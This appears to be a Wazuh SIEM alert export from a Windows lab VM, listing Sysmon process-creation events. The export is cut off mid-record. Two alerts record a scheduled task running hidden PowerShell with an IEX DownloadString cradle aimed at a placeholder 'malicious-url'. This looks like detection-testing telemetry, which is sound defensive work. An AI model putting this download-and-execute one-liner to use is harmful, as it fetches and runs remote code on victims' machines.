wazuh-alerts-4.x-2025.06.09,'--AKVZcBD7y1GXNGlofx,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Windows PowerShell,{154c2aaf-ea73-6846-23bd-220000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ec29-6846-f401-000000001800},0x22bd23,1168,8852,C:\\Windows\\system32\\,2025-06-09 14:14:01.012,"MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""powershell.exe\"" -nop -w hidden -c IEX(New-Object  Net.WebClient).DownloadString(\""http://malicious-url\"")",Medium,10.0.19041.3996 (WinBuild.160101.0800),DESKTOP-O7P9I53\\admin,1,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:14:01.012
ProcessGuid: {154c2aaf-ec29-6846-f401-000000001800}
ProcessId: 8852
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" -nop -w hidden -c IEX(New-Object 
Net.WebClient).DownloadString(""http://malicious-url"")
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-O7P9I53\admin
LogonGuid: {154c2aaf-ea73-6846-23bd-220000000000}
LogonId: 0x22BD23
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:14:01.0152098Z,31624,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,113,false,5,Sysmon - Event 1: Process creation Windows PowerShell,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:14:01.0152098Z"",""eventRecordID"":""31624"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:14:01.012\r\nProcessGuid: {154c2aaf-ec29-6846-f401-000000001800}\r\nProcessId: 8852\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \""powershell.exe\"" -nop -w hidden -c IEX(New-Object \nNet.WebClient).DownloadString(\""http://malicious-url\"")\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-O7P9I53\\admin\r\nLogonGuid: {154c2aaf-ea73-6846-23bd-220000000000}\r\nLogonId: 0x22BD23\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:14:01.012"",""processGuid"":""{154c2aaf-ec29-6846-f401-000000001800}"",""processId"":""8852"",""image"":""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"",""fileVersion"":""10.0.19041.3996 (WinBuild.160101.0800)"",""description"":""Windows PowerShell"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""PowerShell.EXE"",""commandLine"":""\\\""powershell.exe\\\"" -nop -w hidden -c IEX(New-Object  Net.WebClient).DownloadString(\\\""http://malicious-url\\\"")"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""DESKTOP-O7P9I53\\\\admin"",""logonGuid"":""{154c2aaf-ea73-6846-23bd-220000000000}"",""logonId"":""0x22bd23"",""terminalSessionId"":""1"",""integrityLevel"":""Medium"",""hashes"":""MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:44:02.319",EventChannel,1749478442.3602365,"Jun 9, 2025 @ 19:44:02.319", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,'-uAKVZcBD7y1GXNGDoc2,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform, , , , , , , , , , , , , , , , , , , , , , ,16384,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},4,Application,0,"""Successfully scheduled Software Protection service for re-start at 2025-06-10T14:06:27Z. Reason: RulesEngine.""",0,2025-06-09T14:13:27.3968268Z,3350,0,DESKTOP-O7P9I53,0,0,INFORMATION,Microsoft-Windows-Security-SPP,3,false,3,Software protection service scheduled successfully.,"[""windows"",""windows_application""]",60642,windows_eventchannel, ,log,"Jun 9, 2025 @ 19:43:27.703",EventChannel,1749478407.3600770,"Jun 9, 2025 @ 19:43:27.703", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,"2025-06-10T14:06:27Z, RulesEngine",Software Protection Platform Service, , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,'-OAJVZcBD7y1GXNGrIeM,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Windows PowerShell,{154c2aaf-ea73-6846-23bd-220000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ebec-6846-e901-000000001800},0x22bd23,1168,2320,C:\\Windows\\system32\\,2025-06-09 14:13:00.997,"MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""powershell.exe\"" -nop -w hidden -c IEX(New-Object  Net.WebClient).DownloadString(\""http://malicious-url\"")",Medium,10.0.19041.3996 (WinBuild.160101.0800),DESKTOP-O7P9I53\\admin,1,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:13:00.997
ProcessGuid: {154c2aaf-ebec-6846-e901-000000001800}
ProcessId: 2320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" -nop -w hidden -c IEX(New-Object 
Net.WebClient).DownloadString(""http://malicious-url"")
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-O7P9I53\admin
LogonGuid: {154c2aaf-ea73-6846-23bd-220000000000}
LogonId: 0x22BD23
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:13:01.0017227Z,31622,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,112,false,5,Sysmon - Event 1: Process creation Windows PowerShell,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:13:01.0017227Z"",""eventRecordID"":""31622"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:13:00.997\r\nProcessGuid: {154c2aaf-ebec-6846-e901-000000001800}\r\nProcessId: 2320\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \""powershell.exe\"" -nop -w hidden -c IEX(New-Object \nNet.WebClient).DownloadString(\""http://malicious-url\"")\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-O7P9I53\\admin\r\nLogonGuid: {154c2aaf-ea73-6846-23bd-220000000000}\r\nLogonId: 0x22BD23\r\nTerminalSessionId: 1\r\nIntegrityLevel: Medium\r\nHashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:13:00.997"",""processGuid"":""{154c2aaf-ebec-6846-e901-000000001800}"",""processId"":""2320"",""image"":""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"",""fileVersion"":""10.0.19041.3996 (WinBuild.160101.0800)"",""description"":""Windows PowerShell"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""PowerShell.EXE"",""commandLine"":""\\\""powershell.exe\\\"" -nop -w hidden -c IEX(New-Object  Net.WebClient).DownloadString(\\\""http://malicious-url\\\"")"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""DESKTOP-O7P9I53\\\\admin"",""logonGuid"":""{154c2aaf-ea73-6846-23bd-220000000000}"",""logonId"":""0x22bd23"",""terminalSessionId"":""1"",""integrityLevel"":""Medium"",""hashes"":""MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:43:02.291",EventChannel,1749478382.3591948,"Jun 9, 2025 @ 19:43:02.291", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,ZuADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,updater.exe,C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe,Google Updater (x86),{154c2aaf-e982-6846-1900-000000001800},Google Updater (x86),{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2401-000000001800},0x3e7,1168,2408,C:\\Windows\\system32\\,2025-06-09 14:05:42.831,"MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2",C:\\Windows\\System32\\svchost.exe,Google LLC,"\""C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\"" --wake --system",System,138.0.7194.0,NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.831
ProcessGuid: {154c2aaf-ea36-6846-2401-000000001800}
ProcessId: 2408
Image: C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\updater.exe
FileVersion: 138.0.7194.0
Description: Google Updater (x86)
Product: Google Updater (x86)
Company: Google LLC
OriginalFileName: updater.exe
CommandLine: ""C:\Program Files (x86)\Google\GoogleUpdater\138.0.7194.0\updater.exe"" --wake --system
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8462535Z,30717,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,3,false,5,Sysmon - Event 1: Process creation Google Updater (x86),"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8462535Z"",""eventRecordID"":""30717"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.831\r\nProcessGuid: {154c2aaf-ea36-6846-2401-000000001800}\r\nProcessId: 2408\r\nImage: C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\r\nFileVersion: 138.0.7194.0\r\nDescription: Google Updater (x86)\r\nProduct: Google Updater (x86)\r\nCompany: Google LLC\r\nOriginalFileName: updater.exe\r\nCommandLine: \""C:\\Program Files (x86)\\Google\\GoogleUpdater\\138.0.7194.0\\updater.exe\"" --wake --system\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.831"",""processGuid"":""{154c2aaf-ea36-6846-2401-000000001800}"",""processId"":""2408"",""image"":""C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\updater.exe"",""fileVersion"":""138.0.7194.0"",""description"":""Google Updater (x86)"",""product"":""Google Updater (x86)"",""company"":""Google LLC"",""originalFileName"":""updater.exe"",""commandLine"":""\\\""C:\\\\Program Files (x86)\\\\Google\\\\GoogleUpdater\\\\138.0.7194.0\\\\updater.exe\\\"" --wake --system"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=A1044445F76098186DE3B146ABDA9876,SHA256=8CA4F944172F0904B4D70E40A5D61B54439109502E7E3E20D71F8A83BEAD9CE8,IMPHASH=9888642409BEC5969301F0CDEA998BD2"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.189",EventChannel,1749477944.991981,"Jun 9, 2025 @ 19:35:44.189", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,Z-ADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,taskhostw.exe,C:\\Windows\\System32\\taskhostw.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Host Process for Windows Tasks,{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2501-000000001800},0x3e7,1168,2444,C:\\Windows\\system32\\,2025-06-09 14:05:42.834,"MD5=D71630DA4364F89F36B47581D4162639,SHA256=4D84D1DB6C572DA841307B814CCF26478429D3A29F304755CE1BAF110E639F64,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,taskhostw.exe None,System,10.0.19041.5794 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.834
ProcessGuid: {154c2aaf-ea36-6846-2501-000000001800}
ProcessId: 2444
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe None
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=D71630DA4364F89F36B47581D4162639,SHA256=4D84D1DB6C572DA841307B814CCF26478429D3A29F304755CE1BAF110E639F64,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8472448Z,30718,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,4,false,5,Sysmon - Event 1: Process creation Host Process for Windows Tasks,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8472448Z"",""eventRecordID"":""30718"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.834\r\nProcessGuid: {154c2aaf-ea36-6846-2501-000000001800}\r\nProcessId: 2444\r\nImage: C:\\Windows\\System32\\taskhostw.exe\r\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\r\nDescription: Host Process for Windows Tasks\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: taskhostw.exe\r\nCommandLine: taskhostw.exe None\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: MD5=D71630DA4364F89F36B47581D4162639,SHA256=4D84D1DB6C572DA841307B814CCF26478429D3A29F304755CE1BAF110E639F64,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924\r\nParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}\r\nParentProcessId: 1168\r\nParentImage: C:\\Windows\\System32\\svchost.exe\r\nParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\r\nParentUser: NT AUTHORITY\\SYSTEM\""""},""eventdata"":{""utcTime"":""2025-06-09 14:05:42.834"",""processGuid"":""{154c2aaf-ea36-6846-2501-000000001800}"",""processId"":""2444"",""image"":""C:\\\\Windows\\\\System32\\\\taskhostw.exe"",""fileVersion"":""10.0.19041.5794 (WinBuild.160101.0800)"",""description"":""Host Process for Windows Tasks"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""taskhostw.exe"",""commandLine"":""taskhostw.exe None"",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""NT AUTHORITY\\\\SYSTEM"",""logonGuid"":""{154c2aaf-e981-6846-e703-000000000000}"",""logonId"":""0x3e7"",""terminalSessionId"":""0"",""integrityLevel"":""System"",""hashes"":""MD5=D71630DA4364F89F36B47581D4162639,SHA256=4D84D1DB6C572DA841307B814CCF26478429D3A29F304755CE1BAF110E639F64,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924"",""parentProcessGuid"":""{154c2aaf-e982-6846-1900-000000001800}"",""parentProcessId"":""1168"",""parentImage"":""C:\\\\Windows\\\\System32\\\\svchost.exe"",""parentCommandLine"":""C:\\\\Windows\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"",""parentUser"":""NT AUTHORITY\\\\SYSTEM""}}}",log,"Jun 9, 2025 @ 19:35:44.220",EventChannel,1749477944.997758,"Jun 9, 2025 @ 19:35:44.220", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2025.06.09,aeADVZcBD7y1GXNG2YWP,1,1,192.168.254.162,DESKTOP-O7P9I53,001,hat-VMware-Virtual-Platform,WerMgr,C:\\Windows\\System32\\wermgr.exe,Microsoft® Windows® Operating System,{154c2aaf-e982-6846-1900-000000001800},Windows Problem Reporting,{154c2aaf-e981-6846-e703-000000000000},C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule,{154c2aaf-ea36-6846-2101-000000001800},0x3e7,1168,2272,C:\\Windows\\system32\\,2025-06-09 14:05:42.818,"MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6",C:\\Windows\\System32\\svchost.exe,Microsoft Corporation,"\""C:\\Windows\\system32\\wermgr.exe\"" -upload",System,10.0.19041.5794 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,0,NT AUTHORITY\\SYSTEM,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: -
UtcTime: 2025-06-09 14:05:42.818
ProcessGuid: {154c2aaf-ea36-6846-2101-000000001800}
ProcessId: 2272
Image: C:\Windows\System32\wermgr.exe
FileVersion: 10.0.19041.5794 (WinBuild.160101.0800)
Description: Windows Problem Reporting
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WerMgr
CommandLine: ""C:\Windows\system32\wermgr.exe"" -upload
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {154c2aaf-e981-6846-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=250C58FBA93500526A03D5B526E48B3C,SHA256=284F38524C26F39B1DD788210E7310C8DF99EFE8A420A031DC42247E75FC646E,IMPHASH=69C608216376CA2D62C0C27FB0B423E6
ParentProcessGuid: {154c2aaf-e982-6846-1900-000000001800}
ParentProcessId: 1168
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM""",5,2025-06-09T14:05:42.8504993Z,30720,5512,DESKTOP-O7P9I53,1,3292,INFORMATION,Microsoft-Windows-Sysmon,6,false,5,Sysmon - Event 1: Process creation Windows Problem Reporting,"[""windows"",""sysmon"",""sysmon_event1""]",61603,windows_eventchannel,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2025-06-09T14:05:42.8504993Z"",""eventRecordID"":""30720"",""processID"":""3292"",""threadID"":""5512"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-O7P9I53"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: -\r\nUtcTime: 2025-06-09 14:05:42.818\r\nProcessGuid: {154c2aaf-ea36-6846-2101-000000001800}\r\nProcessId: 2272\r\nImage: C:\\Windows\\System32\\wermgr.exe\r\nFileVersion: 10.0.19041.5794 (WinBuild.160101.0800)\r\nDescription: Windows Problem Reporting\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: WerMgr\r\nCommandLine: \""C:\\Windows\\system32\\wermgr.exe\"" -upload\r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: NT AUTHORITY\\SYSTEM\r\nLogonGuid: {154c2aaf-e981-6846-e703-000000000000}\r\nLogonId: 0x3E7\r\nTerminalSessionId: 0\r\nIntegrityLevel: System\r\nHashes: 